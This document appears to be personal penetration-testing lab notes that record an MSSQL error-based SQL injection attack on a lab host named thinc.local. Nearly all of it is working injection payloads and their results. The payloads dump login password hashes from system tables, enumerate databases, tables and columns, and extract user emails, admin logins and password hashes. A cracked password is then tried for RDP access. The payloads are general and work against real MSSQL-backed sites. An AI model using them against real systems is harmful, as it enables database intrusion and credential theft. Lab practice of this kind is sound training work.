' UNION SELECT 1,2,3,4'


SELECT  CASE WHEN COALESCE([dbo].[my-table].[field],"") = '...' THEN 'A'       WHEN COALESCE([dbo].[my-table].[field],"") = '...' THEN 'B'


"SELECT * FROM users WHERE news_id=1


AND 1=CONVERTNVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM [username]..[email] )+CHAR(58)+CH


',CONVERT(INT,(SELECT DISTINCT top 1 master.dbo.fn_varbintohexstr(password_hash) from master.sys.sql_logins WHERE name='sa')))) --

SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins


");SELECT name, password FROM master..sysxlogins

# somewhat working
');'SELECT name, password FROM master..sysxlogins--


");SELECT name, password FROM master..sysxlogins

',CONVERT(INT,(SELECT DISTINCT top 1 master.dbo.fn_varbintohexstr(password_hash) from master.sys.sql_logins WHERE name='sa')))) --


",CONVERT(INT,(SELECT DISTINCT top 1 master.dbo.fn_varbintohexstr(username) from master.sys.sql_logins WHERE name='sa')))) --

#broughtbackresults
"SELECT name, password_hash FROM master.sys.sql_logins

![[1. sql1.png]]

# gave some results
'+CONVERT(INT,users(1))--

![[2. sql2.png]]


1',CONVERT(INT,user_name(1))--


# worked, got version
# noticed have to add additional parenthesis

',convert(int,@@version))--

![[3. sqli 3.png]]


# adding numbers to the n allows enumeration of the columns
',CONVERT(INT,db_name(2)))--


',CONVERT(INT,db_name(6)))--
```shell
# what db is in each column:

',CONVERT(INT,db_name(1)))--
contains master

',CONVERT(INT,db_name(2)))--
contains tempdb

',CONVERT(INT,db_name(3)))--
contains model

',CONVERT(INT,db_name(4)))--
contains msdb

',CONVERT(INT,db_name(5)))--
contains newsletter

',CONVERT(INT,db_name(6)))--
contains archive

',CONVERT(INT,db_name(7-9)))--
contains nothing columns over

```

```shell

',CONVERT(INT,(SELECT top 1 TABLE_NAME FROM information_schema.TABLES)))--
# noting adding )) gives errors
```

![[4. sql table users.png]]

```shell
# number of databases
', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT([name]) AS nvarchar(4000)) FROM [master]..[sysdatabases] )+CHAR(58)+CHAR(58))))--
```


![[5. sql 5 number of databases.png]]


```shell
#extracting number of tables
', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM information_schema.TABLES )+CHAR(58)+CHAR(58))))--
```

![[6. sql tables.png]]
```shell
#extracting table name
', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top 1 TABLE_NAME FROM information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58))))--


```

![[7. sql table name.png]]


```shell
# extracting column names
# column 1 in only table
# COLUMN 1: email 

', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='users' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
```



![[8. column 1.png]]


```shell
#column 2 in table 1 users
# column 2 = user_id
', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 2 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='users' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
```


![[9. column 2.png]]


```shell
# column 3
# username
', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 3 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='users' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--

NOTE IN ALL SQL HAD TO ADD ADDITIONAL ))
```

![[10. COLUMN 3.png]]


```shell
# column 4
', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 4 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='users' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--

# note: username was the last column.
```

```shell
#To extract data, first count the entries in the table (replace table1 with appropriate table name):
', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM users)+CHAR(58)+CHAR(58))))--
```

![[11. table entries.png]]


```shell
# made table 1 users in syntax need to change column 1 and 2
', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 column1+CHAR(58)+column2 FROM (SELECT top 1 column1 , column2 FROM users ORDER BY column1  ASC) sq ORDER BY column1  DESC)+CHAR(58)+CHAR(58))))--
```

![[12. column 1 and 2.png]]

```shell

', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 column1+CHAR(58)+column2 FROM (SELECT top 1 email , username FROM users ORDER BY column1  ASC) sq ORDER BY column1  DESC)+CHAR(58)+CHAR(58))))--


', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 email+CHAR(58)+username FROM (SELECT top 1 email , username FROM users ORDER BY email  ASC) sq ORDER BY email  DESC)+CHAR(58)+CHAR(58))))--



', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 column1+CHAR(58)+column2 FROM (SELECT top 1 column1 , column2 FROM users ORDER BY column1  ASC) sq ORDER BY email  DESC)+CHAR(58)+CHAR(58))))--
```


```shell
# extracting email column data from users table

', CONVERT(INT,(SELECT top 1 email FROM users))--

email found: eric@thinc.local

```

![[13. eric thinc.local.png]]

```shell
#gathering 2nd email
', CONVERT(INT,(SELECT top 1 email FROM users WHERE email NOT IN ('eric@thinc.local'))))--

email found: alice@thinc.local
```

![[14. alice thinc.local.png]]


```shell
# 3rd user email

', CONVERT(INT,(SELECT top 1 email FROM users WHERE email NOT IN ('eric@thinc.local', 'alice@thinc.local'))))--

email found pedro@thinc.local
```


![[15. pedro thinc.local.png]]


```shell
#4th email

', CONVERT(INT,(SELECT top 1 email FROM users WHERE email NOT IN ('eric@thinc.local', 'alice@thinc.local','pedro@thinc.local'))))--

email found: admin@thinc.local
```

![[16. admin @thinc.local.png]]

```shell
', CONVERT(INT,(SELECT top 1 email FROM users WHERE email NOT IN ('eric@thinc.local', 'alice@thinc.local','pedro@thinc.local','admin@thinc.local'))))--

# no error, believe this is all emails.
```


```shell
# names of databases
',CONVERT(INT,db_name(1)))--
contains master

',CONVERT(INT,db_name(2)))--
contains tempdb

',CONVERT(INT,db_name(3)))--
contains model

',CONVERT(INT,db_name(4)))--
contains msdb

',CONVERT(INT,db_name(5)))--
contains newsletter

',CONVERT(INT,db_name(6)))--
contains archive

',CONVERT(INT,db_name(7-9)))--
contains nothing columns over
```

```shell
# godsend
https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
```

```shell
# Extract tables from another database (change other_database and increase N):
', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top 1 TABLE_NAME FROM archive.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58))))--

# archive database table 1 = pmanager
```


![[17. pmanager.png]]

```shell
#shell only 1 table is pmanager, incrementing N does not work.
', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top 2 TABLE_NAME FROM archive.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58))))--
```



```shell
# next step after getting tables from other databases
#Extract columns from another database (change other_database, other_table and increase N):


', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 1 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pmanager' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--

column 1 = alogin
```

![[18. alogin.png]]


```shell
# column 2 = id
', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 2 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pmanager' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
```

![[19. id.png]]


```shell
# column 3 = psw
', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 3 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pmanager' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--

```

![[20. psw.png]]

```shell
# column 4 = came back as psw again, must be all that is in these columns
', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 4 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pmanager' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
```

```shell
1st hash: 3c744b99b8623362b466efb7203fd182

Extract data from another database (change other_database, other_table, other_column and increase N):

', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 1 psw FROM archive..pmanager ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
```


![[21. 1st hash.png]]

```shell
#2nd hash 
5b413fe170836079622f4131fe6efa2d

', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 2 psw FROM archive..pmanager ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
```

![[22. 2nd hash.png]]

```shell
# 3rd hash
7de6b6f0afadd89c3ed558da43930181

', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 3 psw FROM archive..pmanager ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
```

![[23. 3rd hash.png]]

```shell

#4th hash
cb2d5be3c78be06d47b697468ad3b33b
sup3rs3cr3t

', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 4 psw FROM archive..pmanager ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
```

![[24. 4th hash.png]]


```shell
# no more hashes - going to crackstation.
', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 5 psw FROM archive..pmanager ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
```

```shell
#hashes

#1st
N/A


#2nd
7de6b6f0afadd89c3ed558da43930181
N/A

#3rd
7de6b6f0afadd89c3ed558da43930181
N/A





#4th
cb2d5be3c78be06d47b697468ad3b33b
sup3rs3cr3t

Found a password, but dont know which user it goes to.

users:

eric@thinc.local 
alice@thinc.local
pedro@thinc.local
admin@thinc.local
```


```shell
#looking at alogins
# 1st = administrator

', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 alogin FROM (SELECT top 1 alogin FROM archive..pmanager ORDER BY psw ASC) sq ORDER BY alogin DESC)+CHAR(58)+CHAR(58))))--
```

![[25. administrator.png]]

```shell
# 2nd = webadmin
', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 alogin FROM (SELECT top 2 alogin FROM archive..pmanager ORDER BY psw ASC) sq ORDER BY alogin DESC)+CHAR(58)+CHAR(58))))--
```

![[26. webadmin.png]]
```shell

# only 2, 3-4 arent changing
', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 alogin FROM (SELECT top 4 alogin FROM archive..pmanager ORDER BY psw ASC) sq ORDER BY alogin DESC)+CHAR(58)+CHAR(58))))--
```

```shell
#credentials with emails and alogins found arent working for rdp session:

eric@thinc.local 
alice@thinc.local
pedro@thinc.local
admin@thinc.local
administrator
webadmin

pass:
sup3rs3cr3t

login with eric
flag - come back to box later when no one is on it
0c012af5208bac5826bb9dd4d4caedf8

```

```shell
#downloaded thunderbird using
https://raw.githubusercontent.com/mozilla/sumo-kb/main/installing-thunderbird-linux/thunderbird.desktop
```

![[27. proof.txt.png]]